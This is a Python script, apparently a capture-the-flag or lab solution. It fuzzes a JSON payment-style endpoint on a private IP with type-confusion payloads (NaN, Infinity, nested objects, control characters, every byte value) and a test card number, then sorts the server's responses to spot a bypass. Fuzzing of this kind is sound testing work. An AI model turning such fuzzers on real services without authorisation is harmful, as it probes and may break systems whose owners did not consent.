from math import nan
import time
import requests
import random
import string
import threading
import json
from math import nan, inf

attempts = [
    '"1234"',
    '{}',
    '{"":{}}',
    '{"":[]}',
    '{"":"123"}',
    '{"":0}',
    '{"":123}',
    '{"":16E10000}',
    '{"":0E123}',
    '{"":0E0}',
    '{"":0.0}',
    '{"":0.000000001}',
    '{"":12345.12341241414231}',
    '{"":1.0}',
    '{"":Infinity}',
    '{"":-Infinity}',
    '{"":NaN}',
    '{"":-NaN}',
    '{"":true}',
    '{"":false}',
    '{"":null}',
    '{"":undefined}',
    '[]',
    '[{}]',
    '[{},"123"]',
    '[[]]',
    '[[],[]]',
    '[[],"123"]',
    '["123"]',
    '["123","123"]',
    '["1","2","3","4","1","2","3","4","1","2","3","4","1","2","3","4"]',
    '[0]',
    '[0,"123"]',
    '[0,1,2,3,4,5,6,7,8,9]',
    '[123]',
    '[123,"123"]',
    '[123,{}]',
    '[16E10000]',
    '[0E123]',
    '[0E0]',
    '[0.0]',
    '[0.0,"123"]',
    '[0.000000001]',
    '[0.000000001,"123"]',
    '[12345.12341241414231]',
    '[12345.12341241414231,"123"]',
    '[1.0]',
    '[1.0,"123"]',
    '[0.0,1.0,2.0,3.0,4.0,5.0,6.0,7.0,8.0,9.0]',
    '[Infinity]',
    '[Infinity,"123"]',
    '[-Infinity]',
    '[-Infinity,"123"]',
    '[NaN]',
    '[NaN,"123]',
    '[-NaN]',
    '[-NaN,"123"]',
    '[true]',
    '[true,"123"]',
    '[false]',
    '[false,"123"]',
    '[null]',
    '[null,"123"]',
    '[undefined]',
    '[undefined,"123"]',
    '"123154255235235"',
    '"asdasfdsdfsdfgdfjkdf"',
    '"sdf876sdf87sd6f876a8fd5sadf"',
    '"'+ "A"*4 + '"',
    '"öüóúőűáéí"',
    '"-.,-*/+_:?"',
    '"\'"',
    '"\'\'"',
    '"\\""',
    '"\\"\\""',
    '"\\\\"',
    '" "',
    '"\r"',
    '"\n"',
    '"\\u0000"',
    '"\\u0001"',
    '"\\u0002"',
    '"\\u0003"',
    '"\\u2400"',
    '"\\u2401"',
    '"A\\u2401"',
    '"\\u2403"',
    '"\\u2403"',
    '"\\u2418"',
    '"\\u2407"',
    '"123"',
    '0',
    '123',
    '16E10000',
    '0E123',
    '0E0',
    '0.0',
    '0.000000001',
    '12345.12341241414231',
    '1.0',
    'Infinity',
    '-Infinity',
    'NaN',
    '-NaN',
    'true',
    'false',
    'null',
    'undefined',
    '"\t"',
]

types = [{},[],"string","","0","123","123456","999999",0,123,123456,999999,0e0000,0.0,0.1,123.456,True,False,None]
types_extended = types.copy()
for i in types:
    for j in types:
        try:
            types_extended.append({i:j})
        except:
            pass
        types_extended.append([i,j])
    types_extended.append([i])
attempts = []
for i in types_extended:
    for j in types:
        try:
            attempts.append({i:j})
        except:
            pass
        attempts.append([i,j])
    attempts.append([i])
    attempts.append(i)
#attempts = []
for i in range(256):
    attempts.append(chr(i))

for i in range(len(attempts)):
    number = attempts[i]
    jsond = '{"number":%s,"cardNumber":"4242 4242 4242 4242","cardName":"Deathbaron","expiryDate":"12/34","cvv":"123"}' % json.dumps(number)
    resp = requests.post('http://10.10.8.12:28167/post/send_number', data=jsond.encode('utf-8'), headers={"Content-Type":"application/json"})

    if resp.status_code == 500:
        print("[ERR] Invalid type, exception on server side")
    elif "this server could not understand." in resp.text:
        print("[ERR] JSON formatting/decoding error")
    elif "No number provided" in resp.text:
        print("[ERR] Falsy value")
    elif "insufficient funds or wrong details given" in resp.text:
        print("[ERR] Invalid card")
    elif "That wasn't the right number" in resp.text:
        print("[ERR] Wrong number")
    else:
        print("[!!!] " + resp.text)
    print("      " + jsond)